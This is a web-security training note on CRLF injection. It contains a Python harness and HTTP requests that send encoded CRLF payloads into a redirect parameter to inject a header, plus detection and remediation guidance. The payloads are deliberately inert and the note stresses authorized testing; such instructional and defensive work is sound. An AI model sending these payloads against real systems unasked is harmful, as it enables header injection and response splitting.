---
title: "CRLF Injection"
tags: [tree/offensive, cyber/offensive/web/injection/crlf, type/technique, difficulty/hard]
Domain: "[[Web Injection Testing]]"
Color: "#DC143C"
---

# CRLF Injection

> [!warning] Authorized validation only
> Inject only a uniquely named inert response header in an approved test route. Do not poison shared caches, set security-sensitive cookies, split responses to other users, or smuggle requests.

## Parent Learning Order
SQL Injection -> NoSQL Injection -> ORM Injection -> Operating System Command Injection -> Server-Side Template Injection -> LDAP Injection -> XPath Injection -> CRLF Injection -> SSI Injection

## Core Vulnerability & Parser Mechanics (Zero)

> *You place a newline inside a header value. Which component decides that your header has ended?*
>
> Hold your answer — the section below is the response.

CRLF injection occurs when attacker-controlled characters reach a line-oriented protocol field without validation. CR is carriage return (`0x0D`), LF is line feed (`0x0A`), and the pair `CRLF` terminates lines in HTTP/1.x. When an application constructs a response header from untrusted data, an injected CRLF can end the intended header and begin another. A second empty line (`CRLF CRLF`) can terminate the header section and make following bytes appear to be a response body—historically called HTTP response splitting.

The root cause is a protocol-framing violation. HTTP/1.1 messages consist of a start line, header fields, an empty line, and an optional body. Header values cannot contain raw CR or LF. Modern server libraries usually reject them, but legacy frameworks, reverse proxies, custom gateways, logging formats, email headers, and text protocols may expose unsafe construction. The finding must identify the exact parser boundary rather than assuming every `%0d%0a` string reaches the wire.

The decoding chain determines exploitability. A browser sends `%0D%0A`; a CDN may preserve or normalize it; a framework percent-decodes it to control bytes; application code places the value into `Location`, `Content-Disposition`, or a custom header; and the HTTP server serializes the response. If one component validates before a later component decodes again, double-encoded `%250D%250A` can become dangerous only after the second pass. Unicode normalization is relevant only if a component converts a line-separator lookalike into ASCII CR/LF.

CRLF injection is related to but distinct from request smuggling. Response splitting changes the server-to-client message boundary through response data. Request smuggling exploits disagreement between HTTP parsers about request framing, commonly content length and transfer encoding. Header injection can also affect logs: line breaks can forge apparent entries or hide fields. Each sink has its own grammar and must be assessed separately.

Impact depends on placement. Injecting a harmless custom header proves control. More severe outcomes may include security-header removal or duplication, cookie injection, cache poisoning, redirect manipulation, or body confusion. Those effects involve other users or shared infrastructure and should not be tested unless separately authorized. HTTP/2 and HTTP/3 encode headers in binary field blocks and prohibit CR/LF in values, but downgrade gateways can reserialize them into HTTP/1.1; end-to-end validation remains necessary.

The correct defense is rejection of CR, LF, NUL, and disallowed control characters **after final decoding**, plus use of framework header APIs that enforce protocol syntax. Redirect destinations should be parsed as URLs and selected from allowed origins. Filenames in `Content-Disposition` need standards-compliant encoding rather than interpolation. Never “fix” a line break by deleting only `%0d` text before URL decoding.

## Visual Attack Flow

```mermaid
sequenceDiagram
    autonumber
    participant T as Authorized Tester
    participant C as CDN & Load Balancer
    participant W as WAF
    participant A as Web Application
    participant H as HTTP Response Serializer
    participant B as Test Browser
    participant S as SOC & Proxy Logs
    T->>C: redirect URL containing encoded CRLF canary
    C->>W: Normalize path/query once
    W->>A: Forward request with correlation ID
    A->>A: Decode parameter and build Location value
    A->>H: Header value containing raw CRLF
    H->>H: Unsafe serializer treats bytes as line boundary
    H-->>B: 302 with injected X-C2R-Validation header
    B-->>T: Header visible; no shared-cache action
    C-->>S: Original and normalized request features
    A-->>S: Header-rejection event or route trace
    H-->>S: Response header names and protocol version
```

In a secure stack, the serializer rejects the value and the application returns a controlled 400. If an edge strips the header but an origin remains vulnerable, direct origin testing requires explicit scope.

## Weaponization & Practical Execution (Mastery)

### Inert response-header validation

Baseline:

```http
GET /lab/redirect?next=%2Fdashboard HTTP/1.1
Host: portal.example.test
Accept: */*
X-Assessment-ID: C2R-CRLF-005
Connection: close
```

```http
HTTP/1.1 302 Found
Location: /dashboard
Cache-Control: no-store
Content-Length: 0
```

The approved canary appends `%0D%0AX-C2R-Validation%3A%20present`:

```http
GET /lab/redirect?next=%2Fdashboard%0D%0AX-C2R-Validation%3A%20present HTTP/1.1
Host: portal.example.test
Accept: */*
X-Assessment-ID: C2R-CRLF-005
Connection: close
```

Vulnerable wire response:

```http
HTTP/1.1 302 Found
Location: /dashboard
X-C2R-Validation: present
Cache-Control: no-store
Content-Length: 0
```

Secure framework behavior:

```http
HTTP/1.1 400 Bad Request
Content-Type: application/problem+json
X-Request-ID: req-crlf-819

{"title":"Invalid redirect value"}
```

Restricted application trace:

```text
header_name=Location
validation=REJECTED_CONTROL_CHARACTER
decoded_octets=[..., 0x0d, 0x0a, ...]
request_id=req-crlf-819
```

Only the inert `X-C2R-Validation` header is needed. Do not add a second blank line, body, `Set-Cookie`, conflicting `Content-Length`, or cache directive. Their risk can be explained theoretically without affecting another client.

### Differential decoding harness

```python
import requests

URL = "https://portal.example.test/lab/redirect"
HEADERS = {"X-Assessment-ID": "C2R-CRLF-005"}

cases = {
    "literal_safe": "/dashboard",
    "single_encoded": "/dashboard%0D%0AX-C2R-Validation:%20present",
    "double_encoded": "/dashboard%250D%250AX-C2R-Validation:%2520present",
}

for name, raw in cases.items():
    # Prepared URL prevents the client from normalizing the supplied percent sequences.
    req = requests.Request("GET", URL + "?next=" + raw, headers=HEADERS).prepare()
    response = requests.Session().send(req, allow_redirects=False, timeout=3)
    print(name, response.status_code,
          response.headers.get("X-C2R-Validation"),
          response.headers.get("Location"))
```

```text
literal_safe   302 None /dashboard
single_encoded 302 present /dashboard
double_encoded 302 None /dashboard%0D%0AX-C2R-Validation:%20present
finding: one decode occurs before unsafe header serialization
```

The output maps transformations; it is not a bypass cookbook. Repeat through each approved ingress path and record HTTP version. Reverse proxies may reject the origin response, normalize it, or close the connection, so collect both origin-side and edge-side evidence with the same request ID.

**The deliberate break:** preventing CRLF injection reads as stripping carriage returns and newlines from the input.

Those bytes arrive in more forms than a filter enumerates — `%0d%0a`, a lone `%0a`, double-encoded variants, and whatever the framework decodes on your behalf after your check has already run. Filtering characters therefore chases the encoding, and the encoding always has one more form. The defect is structural rather than lexical: a value that the application never validated is being placed into a **line-oriented protocol field**, and the boundary between header and content is decided by bytes that value may contain.

**How you'd spot it:** look at how the header is constructed rather than at how the input is cleaned. Building a response header by string concatenation is the vulnerable shape; using an API that encodes or rejects control characters is the safe one. A framework that raises an error on a header value containing a newline is doing this correctly — one that silently strips is still guessing which encodings it will see.

## Red Team OpSec & Impact

During a scoped portal assessment, a tester noticed that a redirect parameter was copied to `Location`. An encoded CRLF plus the inert `X-C2R-Validation` header appeared in the raw HTTP/1.1 response from a laboratory hostname. The CDN-facing response returned 502 because the edge rejected the malformed origin response, showing that defense in depth reduced exposure but the origin defect remained. No shared-cache or cookie behavior was tested.

The SOC’s WAF rule detected `%0d%0a`, but historical alerts were noisy because log-export endpoints legitimately contained escaped newlines. The improved analytic scopes the signal to parameters that feed headers, decodes once and twice into separate features, and correlates with origin events such as `invalid header value`, 502 responses, connection resets, unexpected response-header names, or response-protocol parse errors. Useful fields include raw and normalized URL, route, response status, upstream status, HTTP version, header-name set, request ID, WAF category, edge action, and serializer exception.

Response-side monitoring should flag headers absent from the route’s normal allowlist, duplicate security headers, control-character rejection, and a mismatch between origin and edge status. A 400 generated before serialization is healthy. A cluster of 502 responses following encoded line-break requests can mean the edge is containing an origin vulnerability and warrants urgent engineering review.

The application team replaced string assignment with a validated redirect helper restricted to relative paths, upgraded the framework, and rejected control bytes after final decoding. Regression tests cover lowercase and uppercase percent encoding, double encoding, mixed `%0d`/literal characters, Unicode separators, duplicate parameters, and HTTP/2-to-HTTP/1 downgrade. Purple-team replay confirmed no canary header at origin or edge and consistent HTTP 400 telemetry.

## Summary

You should now be able to:

- Name the two bytes that separate HTTP headers, and explain what a user who controls them inside a header value can do.
- You control the `Location` header of a 302. Describe a *bounded, authorized* canary that proves injection without poisoning a shared cache.
- Explain why HTTP/2 is largely immune to classic CRLF splitting, and how an HTTP/2-to-HTTP/1 downgrade at a proxy can reintroduce it.

---
> 🔼 Up: [[Web Injection Testing]]
